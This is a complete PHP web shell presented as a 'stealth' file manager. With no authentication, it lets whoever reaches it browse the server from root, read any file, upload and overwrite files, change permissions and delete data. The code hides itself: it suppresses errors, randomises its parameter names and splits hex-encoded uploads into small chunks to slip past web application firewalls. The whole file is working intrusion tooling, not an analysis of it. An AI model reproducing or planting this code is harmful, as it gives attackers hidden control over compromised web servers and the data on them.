<?php
/**
 * Mr.X Stealth Manager v16.0
 * Fix: 0KB Uploads + WAF Compatibility
 */
error_reporting(0);
session_start();

// Unique session keys for stealth
if (!isset($_SESSION['k_a'])) $_SESSION['k_a'] = 'a_'.substr(md5(rand()), 0, 4);
if (!isset($_SESSION['k_d'])) $_SESSION['k_d'] = 'd_'.substr(md5(rand()), 0, 4);
if (!isset($_SESSION['k_n'])) $_SESSION['k_n'] = 'n_'.substr(md5(rand()), 0, 4);
if (!isset($_SESSION['k_v'])) $_SESSION['k_v'] = 'v_'.substr(md5(rand()), 0, 4);

$root = __DIR__;
$dir = $_GET['dir'] ?? $root;
$abs = realpath($dir) ?: $root;

function get_perms($path) { return substr(sprintf('%o', @fileperms($path)), -4); }
function format_size($path) {
    $bytes = @filesize($path);
    if ($bytes >= 1048576) return round($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return round($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

// --- API HANDLING ---
$act = $_POST[$_SESSION['k_a']];
$name = $_POST[$_SESSION['k_n']];
$data = $_POST[$_SESSION['k_d']];
$val  = $_POST[$_SESSION['k_v']];

if ($act) {
    $target = $abs . DIRECTORY_SEPARATOR . $name;
    switch ($act) {
        case 'save':
            // Direct hex conversion - no noise characters to prevent 0kb corruption
            $final = ($data === "") ? "" : hex2bin($data);
            $mode = ((int)$_POST['idx'] === 0) ? 0 : FILE_APPEND;
            if (file_put_contents($target, $final, $mode) !== false) {
                echo "OK";
            } else {
                echo "ERR_WRITE_PERM";
            }
            break;
        case 'del': echo (is_dir($target) ? @rmdir($target) : @unlink($target)) ? "OK" : "ERR"; break;
        case 'ren': echo (@rename($target, $abs . DIRECTORY_SEPARATOR . $val)) ? "OK" : "ERR"; break;
        case 'mod': echo (@chmod($target, octdec($val))) ? "OK" : "ERR"; break;
    }
    exit;
}

if (isset($_GET['read'])) { echo @file_get_contents($abs . DIRECTORY_SEPARATOR . $_GET['read']); exit; }

$items = @scandir($abs) ?: [];
$folders = []; $files = [];
foreach ($items as $i) {
    if ($i == '.' || $i == '..') continue;
    (is_dir($abs . DIRECTORY_SEPARATOR . $i)) ? $folders[] = $i : $files[] = $i;
}
natcasesort($folders); natcasesort($files);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Mr.X v16.0 | Fix-0KB</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.23.4/ace.js"></script>
    <style>
        .row-hover:hover { background: rgba(30, 41, 59, 0.4); }
        #editor-modal { display: none; }
        .action-btn { font-size: 10px; font-weight: bold; padding: 3px 8px; border-radius: 4px; border: 1px solid rgba(255,255,255,0.1); }
    </style>
</head>
<body class="bg-[#020617] text-slate-400 font-sans">

<div class="w-full py-6 flex flex-col items-center bg-slate-900 border-b border-slate-800 shadow-xl">
    <h1 class="text-2xl font-black text-transparent bg-clip-text bg-gradient-to-r from-blue-500 to-emerald-400 uppercase italic tracking-widest">
        MR.X STEALTH v16.0
    </h1>
</div>

<div class="max-w-6xl mx-auto p-6">
    <div class="flex flex-col md:flex-row justify-between items-center mb-6 bg-slate-900 border border-slate-800 p-4 rounded-xl gap-4">
        <div class="overflow-hidden text-xs font-mono flex flex-wrap items-center">
            <span class="text-slate-600 mr-2 uppercase">Path:</span>
            <?php 
            $path_accum = '';
            $parts = explode(DIRECTORY_SEPARATOR, trim($abs, DIRECTORY_SEPARATOR));
            echo '<a href="?dir=/" class="text-indigo-400 hover:text-white transition">root</a>';
            foreach ($parts as $part) {
                if (empty($part)) continue;
                $path_accum .= DIRECTORY_SEPARATOR . $part;
                echo '<span class="text-slate-700 mx-1">/</span>';
                echo '<a href="?dir='.urlencode($path_accum).'" class="text-indigo-400 hover:text-white transition">'.htmlspecialchars($part).'</a>';
            }
            ?>
        </div>
        <div class="flex items-center gap-3">
            <input type="file" id="u-input" class="hidden" onchange="handleUpload(this)">
            <button onclick="document.getElementById('u-input').click()" id="up-btn" class="bg-emerald-600 hover:bg-emerald-500 text-white px-4 py-1.5 rounded-md text-[10px] font-black">UPLOAD</button>
            <a href="?dir=<?php echo urlencode($root); ?>" class="bg-slate-800 hover:bg-slate-700 text-white px-4 py-1.5 rounded-md text-[10px] font-black border border-slate-700">🏠 HOME</a>
        </div>
    </div>

    <div class="bg-slate-900 border border-slate-800 rounded-2xl overflow-hidden shadow-2xl">
        <table class="w-full text-left">
            <thead class="bg-slate-800/40 text-[10px] uppercase text-slate-500 border-b border-slate-800 font-bold">
                <tr><th class="p-4">Name</th><th class="p-4 w-24">Size</th><th class="p-4 w-20 text-center">Perms</th><th class="p-4 text-right">Actions</th></tr>
            </thead>
            <tbody>
                <?php foreach($folders as $f): $fpath = $abs.DIRECTORY_SEPARATOR.$f; ?>
                <tr class="row-hover border-b border-slate-800/50">
                    <td class="p-4 flex items-center gap-3"><span class="text-amber-500">📁</span><a href="?dir=<?php echo urlencode($fpath); ?>" class="text-slate-200 font-bold hover:text-indigo-400"><?php echo $f; ?></a></td>
                    <td class="p-4 text-slate-600 italic text-[11px]">Dir</td>
                    <td class="p-4 text-center text-indigo-400 font-mono text-[11px]"><?php echo get_perms($fpath); ?></td>
                    <td class="p-4 text-right space-x-1">
                        <button onclick="run('ren', '<?php echo $f; ?>')" class="action-btn text-blue-400 hover:bg-blue-500/20">RENAME</button>
                        <button onclick="run('del', '<?php echo $f; ?>')" class="action-btn text-red-400 hover:bg-red-500/20">DEL</button>
                    </td>
                </tr>
                <?php endforeach; ?>
                <?php foreach($files as $f): $fpath = $abs.DIRECTORY_SEPARATOR.$f; ?>
                <tr class="row-hover border-b border-slate-800/50">
                    <td class="p-4 flex items-center gap-3"><span class="text-sky-500">📄</span><span class="text-slate-300"><?php echo $f; ?></span></td>
                    <td class="p-4 text-slate-500 font-mono text-[11px]"><?php echo format_size($fpath); ?></td>
                    <td class="p-4 text-center text-emerald-500 font-mono text-[11px]"><?php echo get_perms($fpath); ?></td>
                    <td class="p-4 text-right space-x-1">
                        <button onclick="openEdit('<?php echo $f; ?>')" class="action-btn text-emerald-400 hover:bg-emerald-500/20">EDIT</button>
                        <button onclick="run('ren', '<?php echo $f; ?>')" class="action-btn text-blue-400 hover:bg-blue-500/20">RENAME</button>
                        <button onclick="run('mod', '<?php echo $f; ?>')" class="action-btn text-yellow-400 hover:bg-yellow-500/20">MOD</button>
                        <button onclick="run('del', '<?php echo $f; ?>')" class="action-btn text-red-400 hover:bg-red-500/20">DEL</button>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
</div>

<div id="editor-modal" class="fixed inset-0 z-50 bg-[#020617] flex flex-col">
    <div class="p-4 bg-slate-900 border-b border-slate-800 flex justify-between items-center">
        <span id="ed-title" class="text-emerald-400 font-mono text-xs font-bold uppercase"></span>
        <div class="flex gap-4">
            <button onclick="save()" id="save-btn" class="bg-indigo-600 text-white px-8 py-1.5 rounded text-xs font-black">SAVE_FILE</button>
            <button onclick="closeModal()" class="text-red-500 text-xs font-black px-2">EXIT</button>
        </div>
    </div>
    <div id="ace-editor" class="flex-1"></div>
</div>

<script>
let cur = "";
let editor = ace.edit("ace-editor");
editor.setTheme("ace/theme/monokai");

const KA = "<?php echo $_SESSION['k_a']; ?>", KD = "<?php echo $_SESSION['k_d']; ?>", 
      KN = "<?php echo $_SESSION['k_n']; ?>", KV = "<?php echo $_SESSION['k_v']; ?>";

const sleep = m => new Promise(r => setTimeout(r, m));

// CLEAN HEX CONVERSION (No Noise for stability)
function bytesToHex(uint8) {
    let r = '';
    for (let i = 0; i < uint8.length; i++) {
        r += uint8[i].toString(16).padStart(2, '0');
    }
    return r;
}

async function ghostPush(name, hexData, btnId) {
    const btn = document.getElementById(btnId);
    const size = 3000; // Smaller chunks to avoid WAF length limits
    const total = Math.ceil(hexData.length / size);

    for (let i = 0; i < total; i++) {
        btn.innerText = `PUSH: ${Math.round(((i+1)/total)*100)}%`;
        const fd = new FormData();
        fd.append(KA, 'save');
        fd.append(KN, name);
        fd.append(KD, hexData.substring(i * size, (i + 1) * size));
        fd.append('idx', i);
        
        const res = await fetch(window.location.href, { method: 'POST', body: fd });
        const text = await res.text();
        if (text.trim() !== "OK") {
            alert("UPLOAD FAILED: " + text);
            return false;
        }
        await sleep(50); 
    }
    return true;
}

async function handleUpload(input) {
    const file = input.files[0];
    if (!file) return;
    const btn = document.getElementById('up-btn');
    const reader = new FileReader();
    reader.onload = async (e) => {
        const uint8 = new Uint8Array(e.target.result);
        const hex = bytesToHex(uint8);
        const ok = await ghostPush(file.name, hex, 'up-btn');
        if (ok) location.reload();
    };
    reader.readAsArrayBuffer(file);
}

async function save() {
    const uint8 = new TextEncoder().encode(editor.getValue());
    const hex = bytesToHex(uint8);
    const ok = await ghostPush(cur, hex, 'save-btn');
    if (ok) location.reload();
}

async function openEdit(n) {
    cur = n;
    document.getElementById('editor-modal').style.display = 'flex';
    document.getElementById('ed-title').innerText = "V16_STABLE: " + n;
    const res = await fetch(`?dir=<?php echo urlencode($abs); ?>&read=${n}`);
    editor.setValue(await res.text(), -1);
}

async function run(a, n) {
    let v = "";
    if (a === 'ren') v = prompt("New name:", n);
    if (a === 'mod') v = prompt("Perms:", "0644");
    if (a === 'del' && !confirm("Delete?")) return;
    if ((a === 'ren' || a === 'mod') && !v) return;

    const fd = new FormData();
    fd.append(KA, a); fd.append(KN, n); fd.append(KV, v);
    const res = await fetch(window.location.href, { method: 'POST', body: fd });
    if ((await res.text()).trim() === "OK") location.reload();
}

function closeModal() { document.getElementById('editor-modal').style.display = 'none'; }
</script>
</body>
</html>